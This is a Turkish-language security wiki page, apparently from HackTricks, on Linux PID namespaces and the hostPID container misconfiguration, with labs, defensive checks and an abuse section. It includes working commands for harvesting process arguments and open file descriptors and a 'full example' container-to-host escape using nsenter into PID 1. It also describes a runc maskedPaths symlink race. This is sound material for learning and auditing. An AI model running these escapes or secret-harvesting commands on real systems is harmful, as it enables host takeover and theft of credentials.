# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID namespace, process'lerin nasıl numaralandırılacağını ve hangi process'lerin görünür olacağını kontrol eder. Bu nedenle bir container gerçek bir makine olmamasına rağmen kendi PID 1'ine sahip olabilir. Namespace içinde workload, yerel bir process tree gibi görünen yapıyı görür. Namespace dışında ise host, gerçek host PID'lerini ve tüm process görünümünü görmeye devam eder.

Security açısından PID namespace önemlidir çünkü process görünürlüğü değerlidir. Bir workload host process'lerini görebildiğinde service adlarını, command-line argument'larını, process argument'larıyla aktarılan secret'ları, `/proc` üzerinden environment'dan türetilen state'i ve potansiyel namespace-entry hedeflerini gözlemleyebilir. Bu process'leri yalnızca görmekten daha fazlasını yapabiliyorsa; örneğin uygun koşullar altında signal gönderebiliyor veya ptrace kullanabiliyorsa sorun çok daha ciddi hale gelir.

## Çalışma Mantığı

Yeni bir PID namespace, kendi dahili process numaralandırmasıyla başlar. İçinde oluşturulan ilk process, namespace'in bakış açısından PID 1 olur; bu da orphaned child process'ler ve signal davranışı için özel init benzeri semantics kazandığı anlamına gelir. Bu durum, container'lardaki init process'leri, zombie reaping ve küçük init wrapper'larının neden bazen kullanıldığıyla ilgili birçok tuhaflığı açıklar.

Önemli security dersi şudur: Bir process yalnızca kendi PID tree'sini gördüğü için izole görünebilir, ancak bu izolasyon kasıtlı olarak kaldırılabilir. Docker bunu `--pid=host` üzerinden, Kubernetes ise `hostPID: true` üzerinden sunar. Container host PID namespace'e katıldığında workload, host process'lerini doğrudan görür ve sonraki birçok attack path çok daha gerçekçi hale gelir.

## Lab

Manuel olarak bir PID namespace oluşturmak için:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell artık özel bir process görünümü görür. `--mount-proc` flag'i önemlidir; çünkü yeni PID namespace ile eşleşen bir procfs instance'ı mount ederek process listesinin içeriden tutarlı olmasını sağlar.

Container davranışını karşılaştırmak için:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Fark hemen görülür ve anlaşılması kolaydır; bu nedenle okuyucular için iyi bir ilk lab çalışmasıdır.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O'daki normal container'lar kendi PID namespace'lerini alır. Kubernetes Pod'ları da genellikle izole bir PID görünümü alır; ancak workload açıkça host PID paylaşımı istemediği sürece. LXC/Incus ortamları aynı kernel primitive'ine dayanır; ancak system-container kullanım senaryoları daha karmaşık process tree'leri ortaya çıkarabilir ve daha fazla debugging kısayolunu teşvik edebilir.

Aynı kural her yerde geçerlidir: runtime PID namespace'ini izole etmemeyi seçtiyse bu, container sınırının bilinçli olarak zayıflatılmasıdır.

## Yanlış Yapılandırmalar

Canonical yanlış yapılandırma host PID paylaşımıdır. Ekipler bunu çoğu zaman debugging, monitoring veya service-management kolaylığıyla gerekçelendirir; ancak her zaman anlamlı bir security exception olarak değerlendirilmelidir. Container'ın host process'leri üzerinde doğrudan bir write primitive'i olmasa bile yalnızca görünürlük sistem hakkında çok şey açığa çıkarabilir. `CAP_SYS_PTRACE` gibi capability'ler veya kullanışlı procfs erişimi eklendiğinde risk önemli ölçüde genişler.

Bir diğer hata, workload varsayılan olarak host process'lerini kill edemediği veya ptrace edemediği için host PID paylaşımının zararsız olduğunu varsaymaktır. Bu sonuç enumeration değerini, namespace-entry hedeflerinin kullanılabilirliğini ve PID görünürlüğünün diğer zayıflatılmış kontrollerle birleşme biçimini göz ardı eder.

## Kötüye Kullanım

Host PID namespace'i paylaşılıyorsa bir attacker host process'lerini inceleyebilir, process argümanlarını toplayabilir, ilgi çekici servisleri belirleyebilir, `nsenter` için aday PID'ler bulabilir veya process görünürlüğünü ptrace ile ilişkili privilege ile birleştirerek host ya da komşu workload'lara müdahale edebilir. Bazı durumlarda yalnızca doğru long-running process'i görmek bile attack planının geri kalanını yeniden şekillendirmek için yeterlidir.

İlk pratik adım her zaman host process'lerinin gerçekten görünür olduğunu doğrulamaktır:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Host PID'leri görünür olduğunda, process argümanları ve namespace-entry hedefleri genellikle en kullanışlı bilgi kaynağı hâline gelir:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` mevcutsa ve yeterli ayrıcalık varsa, görünür bir host işleminin namespace bridge olarak kullanılıp kullanılamayacağını test edin:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Giriş engellense bile host PID paylaşımı, servis düzenini, çalışma zamanı bileşenlerini ve sonraki hedef olarak seçilebilecek ayrıcalıklı süreçleri ortaya çıkardığı için hâlâ değerlidir.

Host PID görünürlüğü, file-descriptor abuse senaryolarını da daha gerçekçi hâle getirir. Ayrıcalıklı bir host sürecinin veya komşu bir workload'un açık durumda hassas bir dosyası ya da socket'i varsa saldırgan, sahiplik durumuna, procfs mount seçeneklerine ve hedef servis modeline bağlı olarak `/proc/<pid>/fd/` dizinini inceleyebilir ve bu handle'ı yeniden kullanabilir.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Bu komutlar, `hidepid=1` veya `hidepid=2` ayarlarının süreçler arası görünürlüğü azaltıp azaltmadığını ve açık secret dosyaları, loglar veya Unix socket'ler gibi bariz şekilde ilgi çekici descriptor'ların gerçekten görünür olup olmadığını yanıtladıkları için kullanışlıdır.

### Tam Örnek: host PID + `nsenter`

Host PID paylaşımı, süreç aynı zamanda host namespace'lerine katılmak için yeterli ayrıcalığa sahip olduğunda doğrudan bir host escape'e dönüşür:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Komut başarılı olursa container process'i artık host'un mount, UTS, network, IPC ve PID namespace'lerinde çalışıyor demektir. Etki, host'un derhâl ele geçirilmesidir.

`nsenter` eksik olsa bile host filesystem'i mount edilmişse aynı sonuç host binary'si aracılığıyla elde edilebilir:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

Bazı PID namespace ile ilgili saldırılar, geleneksel `hostPID: true` yanlış yapılandırmaları değildir; bunun yerine procfs protections'ın container setup sırasında nasıl uygulandığıyla ilgili runtime implementation bug'larıdır.

#### `maskedPaths` race to host procfs

Güvenlik açığı bulunan `runc` sürümlerinde, container image'ını veya `runc exec` workload'unu kontrol edebilen saldırganlar, container tarafındaki `/dev/null` dosyasını `/proc/sys/kernel/core_pattern` gibi hassas bir procfs path'ine işaret eden bir symlink ile değiştirerek masking phase'i race condition'a sokabilir. Race başarılı olursa masked-path bind mount yanlış target üzerine yerleşebilir ve host-global procfs knob'larını yeni container'a expose edebilir.

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Bu önemlidir çünkü nihai etki, doğrudan bir procfs açığa çıkmasıyla aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger`, ardından host üzerinde kod çalıştırma ya da hizmet reddi.

#### `insject` ile Namespace injection

`insject` gibi Namespace injection araçları, PID-namespace etkileşiminin süreç oluşturulmadan önce hedef namespace'e girilmesini her zaman gerektirmediğini gösterir. Bir yardımcı daha sonra bağlanabilir, `setns()` kullanabilir ve hedef PID alanına görünürlüğü koruyarak çalıştırılabilir:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Bu tür teknikler esas olarak, workload zaten initialize edildikten sonra namespace context'in birleştirilmesi gereken advanced debugging, offensive tooling ve post-exploitation workflow'ları için önemlidir.

### İlgili FD Abuse Patterns

Host PID'leri görünür olduğunda iki pattern özellikle belirtilmeye değerdir. İlk olarak, privileged bir process `O_CLOEXEC` ile işaretlenmediği için hassas bir file descriptor'ı `execve()` sonrasında açık tutabilir. İkinci olarak, servisler Unix socket'leri üzerinden `SCM_RIGHTS` aracılığıyla file descriptor aktarabilir. Her iki durumda da ilgi çekici nesne artık pathname değil, lower-privilege bir process'in inherit edebileceği veya receive edebileceği zaten açık olan handle'dır.

Bu durum container çalışmaları açısından önemlidir; çünkü handle, path'in kendisine container filesystem üzerinden doğrudan erişilemese bile `docker.sock`, privileged bir log, host secret file veya başka bir high-value object'e işaret edebilir.

## Kontroller

Bu komutların amacı, process'in private bir PID görünümüne sahip olup olmadığını veya çok daha geniş bir process landscape'i zaten enumerate edip edemediğini belirlemektir.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Burada dikkat çekici olanlar:

- İşlem listesi bariz host servislerini içeriyorsa host PID paylaşımı muhtemelen zaten etkindir.
- Yalnızca küçük bir container-yerel ağaç görmek normal temel durumdur; `systemd`, `dockerd` veya ilgisiz daemon'ları görmek normal değildir.
- Host PID'leri görünür olduğunda, salt okunur işlem bilgileri bile yararlı reconnaissance sağlar.

Host PID paylaşımıyla çalışan bir container keşfederseniz, bunu yalnızca kozmetik bir fark olarak değerlendirmeyin. Bu, workload'un gözlemleyebileceği ve potansiyel olarak etkileyebileceği alanı önemli ölçüde değiştirir.
{{#include ../../../../../banners/hacktricks-training.md}}
